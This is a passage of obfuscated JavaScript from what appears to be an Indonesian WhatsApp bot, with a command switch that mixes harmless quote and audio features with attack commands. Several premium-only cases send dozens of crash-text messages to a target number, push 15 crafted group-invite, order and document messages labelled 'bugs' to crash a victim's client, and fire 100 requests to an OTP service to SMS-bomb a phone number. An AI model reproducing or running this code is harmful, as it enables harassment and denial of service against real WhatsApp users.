            if (isLimit(_0x1b1e88['sender'], _0x75f0ff, _0x7b6ab6, _0x49d6b7, limit)) return _0x358f3b(_0x5804c8(0x887) + _0x3b7c58 + _0x5804c8(0xbc1));
            if (!_0x1b04cf) return _0x358f3b('Masukkan Suratnya\x0aContoh : ' + (_0x3b7c58 + _0x453fc1) + _0x5804c8(0x4fe));
            try {
                let _0x571589 = await fetchJson(_0x5804c8(0xc80) + _0x1b04cf + _0x5804c8(0x45b) + _0x932571[_0x5804c8(0xa28)]);
                const _0x477367 = _0x571589[_0x5804c8(0x6b2)];
                await _0x358f3b(_0x5804c8(0xca9)), await _0x614da8[_0x5804c8(0x938)](_0x1b1e88[_0x5804c8(0x60f)], {
                    'audio': {
                        'url': _0x477367
                    },
                    'mimetype': _0x5804c8(0x8d4)
                }, {
                    'quoted': _0x1b1e88
                });
            } catch (_0x10b68a) {
                _0x358f3b(_0x5804c8(0xd77));
            }
            limitAdd(_0x1b1e88[_0x5804c8(0xd13)], limit);
        }
        break;
        case _0x5804c8(0xd26): {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (isLimit(_0x1b1e88['sender'], _0x75f0ff, _0x7b6ab6, _0x49d6b7, limit)) return _0x358f3b('Limit kamu sudah habis silahkan kirim ' + _0x3b7c58 + _0x5804c8(0xbc1));
            let _0x3efe4c = await fetchJson(_0x5804c8(0xcaf) + _0x932571[_0x5804c8(0xa28)]);
            const _0x369c08 = _0x3efe4c[_0x5804c8(0x6b2)][_0x5804c8(0x200)];
            _0x614da8['sendMessage'](_0x1b1e88['chat'], {
                'text': _0x369c08
            }, {
                'quoted': _0x1b1e88
            });
        }
        limitAdd(_0x1b1e88['sender'], limit);
        break;
        case _0x5804c8(0xc7f): {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (isLimit(_0x1b1e88[_0x5804c8(0xd13)], _0x75f0ff, _0x7b6ab6, _0x49d6b7, limit)) return _0x358f3b('Limit kamu sudah habis silahkan kirim ' + _0x3b7c58 + _0x5804c8(0xbc1));
            let _0x182d5b = await fetchJson(_0x5804c8(0x721) + _0x932571[_0x5804c8(0xa28)]);
            const _0x2f355c = _0x182d5b[_0x5804c8(0x6b2)][_0x5804c8(0x200)];
            _0x614da8['sendMessage'](_0x1b1e88[_0x5804c8(0x60f)], {
                'text': _0x2f355c
            }, {
                'quoted': _0x1b1e88
            });
        }
        limitAdd(_0x1b1e88[_0x5804c8(0xd13)], limit);
        break;
        case _0x5804c8(0xbf1): {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (isLimit(_0x1b1e88[_0x5804c8(0xd13)], _0x75f0ff, _0x7b6ab6, _0x49d6b7, limit)) return _0x358f3b(_0x5804c8(0x887) + _0x3b7c58 + _0x5804c8(0xbc1));
            let _0x51ba06 = await fetchJson(_0x5804c8(0x7aa) + _0x932571[_0x5804c8(0xa28)]);
            const _0x1479f7 = _0x51ba06[_0x5804c8(0x6b2)][_0x5804c8(0x200)];
            _0x614da8[_0x5804c8(0x938)](_0x1b1e88[_0x5804c8(0x60f)], {
                'text': _0x1479f7
            }, {
                'quoted': _0x1b1e88
            });
        }
        limitAdd(_0x1b1e88['sender'], limit);
        break;
        case _0x5804c8(0x79e): {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (isLimit(_0x1b1e88[_0x5804c8(0xd13)], _0x75f0ff, _0x7b6ab6, _0x49d6b7, limit)) return _0x358f3b(_0x5804c8(0x887) + _0x3b7c58 + 'limit untuk mengecek limit');
            let _0x442fdf = await fetchJson('https://api.zahwazein.xyz/randomtext/animequotes?apikey=' + _0x932571[_0x5804c8(0xa28)]);
            const _0x1d05a0 = _0x442fdf[_0x5804c8(0x6b2)][_0x5804c8(0x7a0)],
                _0x463e26 = _0x442fdf[_0x5804c8(0x6b2)][_0x5804c8(0x84b)];
            _0x614da8[_0x5804c8(0x938)](_0x1b1e88[_0x5804c8(0x60f)], {
                'text': _0x463e26 + _0x5804c8(0x6c0) + _0x1d05a0
            }, {
                'quoted': _0x1b1e88
            });
        }
        limitAdd(_0x1b1e88[_0x5804c8(0xd13)], limit);
        break;
        case _0x5804c8(0x796): {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (isLimit(_0x1b1e88[_0x5804c8(0xd13)], _0x75f0ff, _0x7b6ab6, _0x49d6b7, limit)) return _0x358f3b(_0x5804c8(0x887) + _0x3b7c58 + _0x5804c8(0xbc1));
            await _0x614da8[_0x5804c8(0x593)](_0x5804c8(0x9fb), _0x1b1e88[_0x5804c8(0x60f)]), list = [_0x5804c8(0x705), './media/podcast/2.mp3', _0x5804c8(0xc95), _0x5804c8(0x9d8), _0x5804c8(0x21c), './media/podcast/6.mp3', _0x5804c8(0x774), _0x5804c8(0x9f8), './media/podcast/9.mp3'], _0x1b1281 = list[Math['floor'](Math['random']() * list[_0x5804c8(0x977)])], podcastnya = fs['readFileSync'](_0x1b1281), _0x614da8['sendMessage'](_0x1b1e88[_0x5804c8(0x60f)], {
                'audio': podcastnya,
                'mimetype': _0x5804c8(0x8d4),
                'ptt': !![]
            }, {
                'quoted': _0x1b1e88
            });
        }
        limitAdd(_0x1b1e88[_0x5804c8(0xd13)], limit);
        break;
        case _0x5804c8(0xc16): {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (isLimit(_0x1b1e88['sender'], _0x75f0ff, _0x7b6ab6, _0x49d6b7, limit)) return _0x358f3b(_0x5804c8(0x887) + _0x3b7c58 + _0x5804c8(0xbc1));
            await _0x614da8[_0x5804c8(0x593)](_0x5804c8(0x9fb), _0x1b1e88[_0x5804c8(0x60f)]), list = ['./media/sadpodcast/1.mp3', _0x5804c8(0x192), _0x5804c8(0x4ea), _0x5804c8(0x7ca), _0x5804c8(0x572), _0x5804c8(0xd65), './media/sadpodcast/7.mp3'], _0x1b1281 = list[Math[_0x5804c8(0xa2b)](Math['random']() * list[_0x5804c8(0x977)])], sadpodcastnya = fs[_0x5804c8(0x456)](_0x1b1281), _0x614da8[_0x5804c8(0x938)](_0x1b1e88[_0x5804c8(0x60f)], {
                'audio': sadpodcastnya,
                'mimetype': 'audio/mpeg',
                'ptt': !![]
            }, {
                'quoted': _0x1b1e88
            });
        }
        limitAdd(_0x1b1e88[_0x5804c8(0xd13)], limit);
        break;
        case _0x5804c8(0x20f): {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (isLimit(_0x1b1e88['sender'], _0x75f0ff, _0x7b6ab6, _0x49d6b7, limit)) return _0x358f3b(_0x5804c8(0x887) + _0x3b7c58 + _0x5804c8(0xbc1));
            const _0x2a404d = [_0x5804c8(0xa5b), _0x5804c8(0x846), _0x5804c8(0x22b), _0x5804c8(0xc6d), _0x5804c8(0x329), _0x5804c8(0x91d), 'Mengakhiri bukan berarti tidak mau berjuang lagi...hanya saja aku tidak mau ada lgi,hati yg tersakiti.\x0a\x0aBy putri', _0x5804c8(0xbd9), _0x5804c8(0x4d9), _0x5804c8(0x92a), _0x5804c8(0x32f), _0x5804c8(0xcb7), _0x5804c8(0x82a), _0x5804c8(0x193), 'Jangan iri dan sedih jika kamu tidak memiliki kemampuan seperti yang orang miliki. Yakinlah orang lain juga tidak memiliki kemampuan sepertimu', _0x5804c8(0x5b6), 'Tetap tersenyum walaluku masih dibuat menunggu dan rindu olehmu, tapi itu demi kamu', _0x5804c8(0xc9d), 'Secuek-cueknya kamu ke aku, aku tetap sayang sama kamu karena kamu telah menerima aku apa adanya', _0x5804c8(0xbb8), 'Jadilah diri sendiri, jangan mengikuti orang lain, tetapi tidak sanggup untuk menjalaninya', 'Cobalah terdiam sejenak untuk memikirkan bagaimana caranya agar kita dapat menyelesaikan masalah ini bersama-sama', _0x5804c8(0x241), 'Aku ingin kamu bisa langgeng sama aku dan yang aku harapkan kamu bisa jadi jodohku', _0x5804c8(0x582), 'Masalah terbesar dalam diri seseorang adalah tak sanggup melawan rasa takutnya', _0x5804c8(0x229), _0x5804c8(0xcf4), _0x5804c8(0xca0), _0x5804c8(0x652), _0x5804c8(0x653), 'Aku takut kamu kenapa-napa, aku panik jika kamu sakit, itu karena aku cinta dan sayang padamu', _0x5804c8(0x831), _0x5804c8(0x139), _0x5804c8(0x1b9), 'Senyum manismu sangatlah indah, jadi janganlah sampai kamu bersedih', _0x5804c8(0xc5f), _0x5804c8(0xafd), _0x5804c8(0x1ac), _0x5804c8(0xcb8), _0x5804c8(0xa8d), _0x5804c8(0x966), 'Aku tak menyangka kamu pergi dan melupakan ku begitu cepat', _0x5804c8(0x285), _0x5804c8(0x947), 'Aku tak tahu sebenarnya di dalam hatimu itu ada aku atau dia', _0x5804c8(0x33c), _0x5804c8(0x2d6), 'Tolong jangan pergi meninggalkanku aku masih sangat mencintai dan menyayangimu', _0x5804c8(0x225), _0x5804c8(0x68e), _0x5804c8(0x1e0), _0x5804c8(0x68c), 'Mungkin sekarang jodohku masih jauh dan belum bisa aku dapat tapi aku yakin jodoh itu Takkan kemana-mana dan akan ku dapatkan', _0x5804c8(0x6ea), _0x5804c8(0x542), _0x5804c8(0x432), 'Aku berdiri disini sendiri menunggu kehadiran dirimu', _0x5804c8(0x59e), 'Maaf aku lupa ternyata aku bukan siapa-siapa', _0x5804c8(0x30d), 'Aku tidak bisa selamanya menunggu dan kini aku menjadi ragu Apakah kamu masih mencintaiku', _0x5804c8(0xc18), 'Lebih baik sendiri daripada berdua tapi tanpa kepastian', _0x5804c8(0x191), _0x5804c8(0x745), _0x5804c8(0x209), _0x5804c8(0x537), _0x5804c8(0xb68), 'Maafkan aku sayang tidak bisa menjadi seperti yang kamu mau', _0x5804c8(0x822), 'Aku bukan mencari yang sempurna tapi yang terbaik untukku', _0x5804c8(0x89b), _0x5804c8(0xbec), _0x5804c8(0x386), _0x5804c8(0x9d2), _0x5804c8(0xa6c), _0x5804c8(0x60a), _0x5804c8(0x579), 'Perasaan Bodo gue adalah bisa jatuh cinta sama orang yang sama meski udah disakiti berkali-kali', _0x5804c8(0x685), _0x5804c8(0x9e5), 'Aku sayang kamu tapi aku masih takut untuk mencintaimu', _0x5804c8(0x70b), 'Aku tidak pernah berpikir kamu akan menjadi yang sementara', 'Jodoh itu bukan seberapa dekat kamu dengannya tapi seberapa yakin kamu dengan Allah', _0x5804c8(0xb73), _0x5804c8(0x539), _0x5804c8(0x7e4), 'Tak perlu membalas dengan menyakiti biar Karma yang akan urus semua itu', _0x5804c8(0x6e0), _0x5804c8(0xc3e)],
                _0x2d1d3b = _0x2a404d[Math[_0x5804c8(0xa2b)](Math['random']() * _0x2a404d[_0x5804c8(0x977)])];
            _0x358f3b('' + _0x2d1d3b), backsoundnya = fs[_0x5804c8(0x456)]('./media/sound/galau.mp3'), _0x614da8[_0x5804c8(0x938)](_0x1b1e88[_0x5804c8(0x60f)], {
                'audio': backsoundnya,
                'mimetype': _0x5804c8(0x8d4),
                'ptt': !![]
            }, {
                'quoted': _0x1b1e88
            });
        }
        limitAdd(_0x1b1e88[_0x5804c8(0xd13)], limit);
        break;
        case _0x5804c8(0x7e9):
        case '🌷':
        case '🐲':
        case '🐉':
        case '🌵':
        case '🎄':
        case '🌲':
        case '🌳':
        case '🌱':
        case '🌿':
        case '🍀':
        case '☘️': {
            if (!_0x7b6ab6) return _0x358f3b('Khusus Premium!');
            if (!_0x83eae5[0x0]) return _0x358f3b(_0x5804c8(0xbf5) + (_0x3b7c58 + _0x453fc1) + _0x5804c8(0x23d) + (_0x3b7c58 + _0x453fc1) + ' 6285600793871');
            Pe = _0x1b04cf['split']('|')[0x0] + '@s.whatsapp.net';
            if (_0x83eae5[0x0][_0x5804c8(0xac2)](_0x5804c8(0xb48))) return _0x358f3b('Ngapain Mau Kirim Ke Owner? Lu Mau Gw Spam?');
            _0x358f3b(_0x5804c8(0x480)), _0x614da8[_0x5804c8(0x938)](Pe, {
                'text': '' + ngazap(_0x3b7c58)
            }, {
                'quoted': _0x4ac503
            }), await sleep(0x7d0), _0x614da8['sendMessage'](Pe, {
                'text': '' + ngazap(_0x3b7c58)
            }, {
                'quoted': _0x4ac503
            }), await sleep(0x7d0), _0x614da8['sendMessage'](Pe, {
                'text': '' + ngazap(_0x3b7c58)
            }, {
                'quoted': _0x4ac503
            }), await sleep(0x7d0), _0x614da8['sendMessage'](Pe, {
                'text': '' + ngazap(_0x3b7c58)
            }, {
                'quoted': _0x4ac503
            }), await sleep(0x7d0), _0x614da8[_0x5804c8(0x938)](Pe, {
                'text': '' + ngazap(_0x3b7c58)
            }, {
                'quoted': _0x4ac503
            }), await sleep(0x7d0), _0x614da8[_0x5804c8(0x938)](Pe, {
                'text': '' + ngazap(_0x3b7c58)
            }, {
                'quoted': _0x4ac503
            }), await sleep(0x7d0), _0x614da8[_0x5804c8(0x938)](Pe, {
                'text': '' + ngazap(_0x3b7c58)
            }, {
                'quoted': _0x4ac503
            }), await sleep(0x7d0), _0x614da8[_0x5804c8(0x938)](Pe, {
                'text': '' + ngazap(_0x3b7c58)
            }, {
                'quoted': _0x4ac503
            }), await sleep(0x7d0), _0x614da8[_0x5804c8(0x938)](Pe, {
                'text': '' + ngazap(_0x3b7c58)
            }, {
                'quoted': _0x4ac503
            }), await sleep(0x7d0), _0x614da8[_0x5804c8(0x938)](Pe, {
                'text': '' + ngazap(_0x3b7c58)
            }, {
                'quoted': _0x4ac503
            }), await sleep(0x7d0), _0x614da8[_0x5804c8(0x938)](Pe, {
                'text': '' + ngazap(_0x3b7c58)
            }, {
                'quoted': _0x4ac503
            }), await sleep(0x7d0), _0x614da8[_0x5804c8(0x938)](Pe, {
                'text': '' + ngazap(_0x3b7c58)
            }, {
                'quoted': _0x4ac503
            }), await sleep(0x7d0), _0x614da8[_0x5804c8(0x938)](Pe, {
                'text': '' + ngazap(_0x3b7c58)
            }, {
                'quoted': _0x4ac503
            }), await sleep(0x7d0), _0x614da8[_0x5804c8(0x938)](Pe, {
                'text': '' + ngazap(_0x3b7c58)
            }, {
                'quoted': _0x4ac503
            }), await sleep(0x7d0), _0x614da8[_0x5804c8(0x938)](Pe, {
                'text': '' + ngazap(_0x3b7c58)
            }, {
                'quoted': _0x4ac503
            }), await sleep(0x7d0), _0x614da8[_0x5804c8(0x938)](Pe, {
                'text': '' + ngazap(_0x3b7c58)
            }, {
                'quoted': _0x4ac503
            }), await sleep(0x7d0), _0x614da8[_0x5804c8(0x938)](Pe, {
                'text': '' + ngazap(_0x3b7c58)
            }, {
                'quoted': _0x4ac503
            }), await sleep(0x7d0), _0x614da8[_0x5804c8(0x938)](Pe, {
                'text': '' + ngazap(_0x3b7c58)
            }, {
                'quoted': _0x4ac503
            }), await sleep(0x7d0), _0x614da8[_0x5804c8(0x938)](Pe, {
                'text': '' + ngazap(_0x3b7c58)
            }, {
                'quoted': _0x4ac503
            }), await sleep(0x7d0), _0x614da8['sendMessage'](Pe, {
                'text': '' + ngazap(_0x3b7c58)
            }, {
                'quoted': _0x4ac503
            }), await sleep(0x7d0), _0x614da8[_0x5804c8(0x938)](Pe, {
                'text': '' + ngazap(_0x3b7c58)
            }, {
                'quoted': _0x4ac503
            }), await sleep(0x7d0), _0x614da8[_0x5804c8(0x938)](Pe, {
                'text': '' + ngazap(_0x3b7c58)
            }, {
                'quoted': _0x4ac503
            }), await sleep(0x7d0), _0x614da8[_0x5804c8(0x938)](Pe, {
                'text': '' + ngazap(_0x3b7c58)
            }, {
                'quoted': _0x4ac503
            }), await sleep(0x7d0), _0x614da8[_0x5804c8(0x938)](Pe, {
                'text': '' + ngazap(_0x3b7c58)
            }, {
                'quoted': _0x4ac503
            }), await sleep(0x7d0), _0x614da8[_0x5804c8(0x938)](Pe, {
                'text': '' + ngazap(_0x3b7c58)
            }, {
                'quoted': _0x4ac503
            }), await sleep(0x7d0), _0x614da8[_0x5804c8(0x938)](Pe, {
                'text': '' + ngazap(_0x3b7c58)
            }, {
                'quoted': _0x4ac503
            }), await sleep(0x7d0), _0x614da8['sendMessage'](Pe, {
                'text': '' + ngazap(_0x3b7c58)
            }, {
                'quoted': _0x4ac503
            }), await sleep(0x7d0), _0x614da8['sendMessage'](Pe, {
                'text': '' + ngazap(_0x3b7c58)
            }, {
                'quoted': _0x4ac503
            }), await sleep(0x7d0), _0x614da8['sendMessage'](Pe, {
                'text': '' + ngazap(_0x3b7c58)
            }, {
                'quoted': _0x4ac503
            }), await sleep(0x7d0), _0x614da8['sendMessage'](Pe, {
                'text': '' + ngazap(_0x3b7c58)
            }, {
                'quoted': _0x4ac503
            }), await sleep(0x7d0), _0x614da8[_0x5804c8(0x938)](Pe, {
                'text': '' + ngazap(_0x3b7c58)
            }, {
                'quoted': _0x4ac503
            }), await sleep(0x7d0), _0x614da8[_0x5804c8(0x938)](Pe, {
                'text': '' + ngazap(_0x3b7c58)
            }, {
                'quoted': _0x4ac503
            }), await sleep(0x7d0);
        }
        _0x358f3b(_0x5804c8(0x197) + Pe + ' Tolong Jeda 3 Menit Yah*');
        break;
        case _0x5804c8(0xd9b):
            if (!_0x7b6ab6) return _0x358f3b(_0x5804c8(0x321));
            if (!_0x83eae5[0x0]) return _0x358f3b(_0x5804c8(0xbf5) + (_0x3b7c58 + _0x453fc1) + ' nomor\x0aContoh ' + (_0x3b7c58 + _0x453fc1) + _0x5804c8(0x5c8));
            Pe = _0x1b04cf[_0x5804c8(0x4bd)]('|')[0x0] + '@s.whatsapp.net';
            if (_0x83eae5[0x0][_0x5804c8(0xac2)](_0x5804c8(0xb48))) return _0x358f3b(_0x5804c8(0x1bd));
            _0x358f3b(_0x5804c8(0x335)), _0x4a8e4e = '15';
            for (let _0x26f4e8 = 0x0; _0x26f4e8 < _0x4a8e4e; _0x26f4e8++) {
                var _0x21cf00 = generateWAMessageFromContent(_0x1b1e88[_0x5804c8(0x60f)], proto['Message'][_0x5804c8(0xd64)]({
                    'groupInviteMessage': {
                        'groupJid': _0x5804c8(0xbb4),
                        'inviteCode': _0x5804c8(0x273),
                        'inviteExpiration': _0x5804c8(0x81c),
                        'groupName': _0x5804c8(0xd41) + ngazap(_0x3b7c58),
                        'jpegThumbnail': _0x5804c8(0x628),
                        'caption': '*https://wa.me/settings*\x0a𝙅𝙪𝙣𝙖𝘽𝙤𝙩-𝙈𝙙 ' + ngazap(_0x3b7c58)
                    }
                }), {
                    'userJid': _0x1b1e88['chat'],
                    'quoted': _0x1b1e88
                });
                _0x614da8[_0x5804c8(0xbaf)](Pe, _0x21cf00['message'], {
                    'messageId': _0x21cf00[_0x5804c8(0x2a9)]['id']
                });
            }
            _0x358f3b(_0x5804c8(0x197) + Pe + ' Tolong Jeda 3 Menit Yah*');
            break;
        case _0x5804c8(0xa77):
            if (!_0x7b6ab6) return _0x358f3b(_0x5804c8(0x321));
            if (!_0x83eae5[0x0]) return _0x358f3b('Penggunaan ' + (_0x3b7c58 + _0x453fc1) + _0x5804c8(0x3a2) + (_0x3b7c58 + _0x453fc1) + _0x5804c8(0xd3a));
            _0x358f3b(_0x5804c8(0x335)), bnnd = _0x1b04cf[_0x5804c8(0x4bd)]('|')[0x0] + _0x5804c8(0xc4e), _0x4a8e4e = '15';
            for (let _0x4533eb = 0x0; _0x4533eb < _0x4a8e4e; _0x4533eb++) {
                var _0x21cf00 = generateWAMessageFromContent(_0x1b1e88[_0x5804c8(0x60f)], proto[_0x5804c8(0x1fc)]['fromObject']({
                    'groupInviteMessage': {
                        'groupJid': _0x5804c8(0xbb4),
                        'inviteCode': _0x5804c8(0x273),
                        'inviteExpiration': _0x5804c8(0x81c),
                        'groupName': _0x5804c8(0xd41) + ngazap(_0x3b7c58),
                        'jpegThumbnail': _0x5804c8(0x628),
                        'caption': _0x5804c8(0x6dc) + ngazap(_0x3b7c58)
                    }
                }), {
                    'userJid': _0x1b1e88['chat'],
                    'quoted': _0x1b1e88
                });
                _0x614da8[_0x5804c8(0xbaf)](bnnd, _0x21cf00['message'], {
                    'messageId': _0x21cf00[_0x5804c8(0x2a9)]['id']
                });
            }
            _0x358f3b('*Sukses mengirim Bug Ke ' + bnnd + _0x5804c8(0xae0));
            break;
        case 'bugs':
            if (!_0x7b6ab6) return _0x358f3b(_0x5804c8(0x321));
            if (_0x83eae5[_0x5804c8(0x977)] == 0x0) return _0x358f3b('Penggunaan ' + (_0x3b7c58 + _0x453fc1) + ' jumlah\x0aContoh ' + (_0x3b7c58 + _0x453fc1) + ' 5');
            _0x4a8e4e = '' + encodeURI(q), ydd = _0x5804c8(0xbba);
            for (let _0x4875dc = 0x0; _0x4875dc < _0x4a8e4e; _0x4875dc++) {
                _0x614da8[_0x5804c8(0x938)](_0x1b1e88[_0x5804c8(0x60f)], {
                    'sticker': {
                        'url': '' + _0x932571['pathimg']
                    }
                }, {
                    'quoted': {
                        'key': {
                            'fromMe': ![],
                            'participant': _0x5804c8(0x860),
                            ...{
                                'remoteJid': ''
                            }
                        },
                        'message': {
                            'stickerMessage': {
                                'url': _0x5804c8(0xa97),
                                'fileSha256': _0x5804c8(0x717),
                                'fileEncSha256': _0x5804c8(0x1c3),
                                'mediaKey': _0x5804c8(0x35c),
                                'mimetype': 'image/webp',
                                'height': 0x40,
                                'width': 0x40,
                                'directPath': _0x5804c8(0xc4b),
                                'fileLength': '7774',
                                'mediaKeyTimestamp': '1657290167',
                                'isAnimated': ![]
                            }
                        }
                    }
                });
            }
            break;
        case 'spams': {
            if (!_0x7b6ab6) return _0x358f3b(_0x5804c8(0x3a1));
            const _0x344a02 = _0x1b1e88[_0x5804c8(0x6a4)] ? _0x1b1e88[_0x5804c8(0x6a4)][_0x5804c8(0xd13)] : _0x1b04cf['replace'](/[^0-9]/g, '') + _0x5804c8(0x7cd);
            if (_0x1b1e88[_0x5804c8(0x6a4)] || _0x1b04cf) {
                if (_0x344a02['startsWith']('08')) return _0x54c78e(_0x5804c8(0x91c));
                if (_0x344a02[_0x5804c8(0xac2)](_0x5804c8(0x954))) return _0x54c78e(_0x5804c8(0x6a0));
                let _0x53eb46 = '+' + _0x344a02[_0x5804c8(0xa72)]('@s.whatsapp.net', ''),
                    _0x672939 = [_0x5804c8(0x2cf), 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v1692361810532096513 t9071033982482470646', _0x5804c8(0x3a0), 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v8880767681151577953 t8052286838287810618', 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36 RuxitSynthetic/1.0 v6215776200348075665 t6662866128547677118', 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v1588190262877692089 t2919217341348717815', _0x5804c8(0x98f), _0x5804c8(0x48d), _0x5804c8(0x48d), _0x5804c8(0x301), _0x5804c8(0x90a)],
                    _0x5784b8 = _0x672939[Math['floor'](Math[_0x5804c8(0xbbf)]() * _0x672939['length'])],
                    _0x505d5e = require(_0x5804c8(0x6d5))[_0x5804c8(0x3cb)],
                    _0x3b9487 = {
                        'user-agent': _0x5804c8(0x459)
                    };
                const _0x989018 = {
                    'phone': _0x53eb46
                };
                for (let _0x280757 = 0x0; _0x280757 < 0x64; _0x280757++) {
                    _0x505d5e[_0x5804c8(0x5ae)](_0x5804c8(0x8c7), _0x989018, {
                        'headers': _0x3b9487
                    })[_0x5804c8(0xabe)](_0x512cb4 => {
                        const _0x274dfd = _0x5804c8;
                        console[_0x274dfd(0xcd3)](_0x512cb4);
                    })[_0x5804c8(0xb9d)](_0x182ea9 => {
                        const _0x2c4548 = _0x5804c8;
                        console[_0x2c4548(0xcd3)]('[' + new Date()[_0x2c4548(0x931)]() + _0x2c4548(0x183));
                    });
                }
            } else _0x358f3b('Penggunaan spamsms nomor/reply pesan target*\x0aContoh spamsms +6281214281312');
            _0x358f3b(_0x5804c8(0x663));
        }
        break;
        case 'juna': {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (!_0x7b6ab6 && !_0x75f0ff) return _0x358f3b(_0x5804c8(0x86c));
            _0x614da8['sendMessage'](_0x1b1e88[_0x5804c8(0x60f)], {
                'text': _0x5804c8(0xa82)
            }, {
                'quoted': _0x4ac503
            });
        }
        break;
        case _0x5804c8(0x8cc): {
            if (!_0x7b6ab6) return _0x358f3b(_0x5804c8(0x3a1));
            if (!_0x83eae5[0x0]) return _0x358f3b('Penggunaan ' + (_0x3b7c58 + _0x453fc1) + _0x5804c8(0x3a2) + (_0x3b7c58 + _0x453fc1) + _0x5804c8(0xd3a));
            _0x358f3b(_0x5804c8(0x335)), bnnd = _0x1b04cf[_0x5804c8(0x4bd)]('|')[0x0] + '@g.us', _0x4a8e4e = '15';
            for (let _0xa5d4c3 = 0x0; _0xa5d4c3 < _0x4a8e4e; _0xa5d4c3++) {
                let _0x10570d = {
                    'key': {
                        'participant': _0x5804c8(0x860)
                    },
                    'message': {
                        'documentMessage': {
                            'title': '© ' + ngazap(_0x3b7c58),
                            'jpegThumbnail': _0xfc3dc4
                        }
                    }
                };
                var _0x5d1336 = generateWAMessageFromContent(_0x1b1e88[_0x5804c8(0x60f)], proto[_0x5804c8(0x1fc)][_0x5804c8(0xd64)]({
                    'orderMessage': {
                        'orderId': _0x5804c8(0x5f1),
                        'thumbnail': virgam,
                        'itemCount': 0x7cf,
                        'status': _0x5804c8(0x46b),
                        'surface': _0x5804c8(0xc27),
                        'message': '' + ngazap(_0x3b7c58),
                        'orderTitle': ' BUG TROLI ',
                        'sellerJid': '6285600793871@s.whatsapp.net',
                        'token': _0x5804c8(0x6dd)
                    }
                }), {
                    'userJid': _0x1b1e88[_0x5804c8(0x60f)],
                    'quoted': _0x4ac503
                });
                _0x614da8[_0x5804c8(0xbaf)](bnnd, _0x5d1336['message'], {
                    'messageId': _0x5d1336[_0x5804c8(0x2a9)]['id']
                });
            }
            _0x358f3b('*Sukses mengirim Bug Ke ' + bnnd + _0x5804c8(0x53e));
        }
        break;
        case 'docugc': {
            if (!_0x7b6ab6) return _0x358f3b(_0x5804c8(0x3a1));
            if (_0x83eae5[_0x5804c8(0x977)] < 0x1) return _0x1b1e88[_0x5804c8(0x322)](_0x5804c8(0xbf5) + (_0x3b7c58 + _0x453fc1) + _0x5804c8(0x7fd) + (_0x3b7c58 + _0x453fc1) + _0x5804c8(0xd3a));
            _0x358f3b('Proses'), bnnd = _0x1b04cf['split']('|')[0x0] + _0x5804c8(0xc4e), _0x4a8e4e = '15';
            for (let _0x262a4c = 0x0; _0x262a4c < _0x4a8e4e; _0x262a4c++) {
                var _0x17bfbb = generateWAMessageFromContent(_0x1b1e88['chat'], proto[_0x5804c8(0x1fc)][_0x5804c8(0xd64)]({
                    'documentMessage': {
                        'url': _0x5804c8(0xb50),
                        'mimetype': '',
                        'title': '𝗕𝗔𝗦𝗘 𝗦𝗜𝗗',
                        'fileSha256': _0x5804c8(0xd8e),
                        'pageCount': 0x0,
                        'mediaKey': _0x5804c8(0x327),
                        'fileName': _0x358b6e + _0x5804c8(0x3df) + ngazap(_0x3b7c58) + '.𝗕𝗔𝗦𝗘 𝗦𝗜𝗗',
                        'fileEncSha256': _0x5804c8(0xb39),
                        'directPath': '/v/t62.7119-24/19245462_2210838589082189_6252828231656384414_n.enc?ccb=11-4&oh=01_AVxdbYsmdj4IcIAC5_cBEX2zk7LnBmgTLyqZ7H83Z0Ci_g&oe=6303EB20',
                        'mediaKeyTimestamp': _0x5804c8(0x4fd),
                        'caption': ' ' + _0x358b6e + ' ' + ngazap(_0x3b7c58)
                    }
                }), {
                    'userJid': _0x1b1e88[_0x5804c8(0x60f)],
                    'quoted': _0x4ac503
                });
                _0x614da8[_0x5804c8(0xbaf)](bnnd, _0x17bfbb[_0x5804c8(0x200)], {
                    'messageId': _0x17bfbb[_0x5804c8(0x2a9)]['id']
                });
            }
            _0x358f3b(_0x5804c8(0x197) + bnnd + _0x5804c8(0x53e));
        }
        break;
        case _0x5804c8(0xb86): {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            var _0x60bb8d = _0x5804c8(0x8e0),
                _0x224769 = ['𝐌𝐲 𝐆𝐨𝐝', _0x5804c8(0x4f2), _0x5804c8(0x9cd), _0x5804c8(0xb7d), _0x5804c8(0x2ac), _0x5804c8(0x928), _0x5804c8(0xb58), _0x5804c8(0x52a), _0x5804c8(0x704), _0x5804c8(0x9e9), _0x5804c8(0x2bc), _0x5804c8(0x25c), '𝐉𝐮𝐧𝐧', _0x5804c8(0xd63), _0x5804c8(0xbcf), '' + _0x60bb8d];
            let {
                key: _0x19a7ae
            } = await _0x614da8[_0x5804c8(0x938)](_0x1b1e88['chat'], {
                'text': _0x5804c8(0x3f9)
            }, {
                'quoted': _0x1b1e88
            });
            for (let _0x1271b2 = 0x0; _0x1271b2 < _0x224769[_0x5804c8(0x977)]; _0x1271b2++) {
                await sleep(0x3e8), await _0x614da8[_0x5804c8(0x938)](_0x1b1e88[_0x5804c8(0x60f)], {
                    'text': _0x224769[_0x1271b2],
                    'edit': _0x19a7ae
                }, {
                    'quoted': _0x1b1e88
                });
            }
        }
        break;
        case _0x5804c8(0xaef): {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
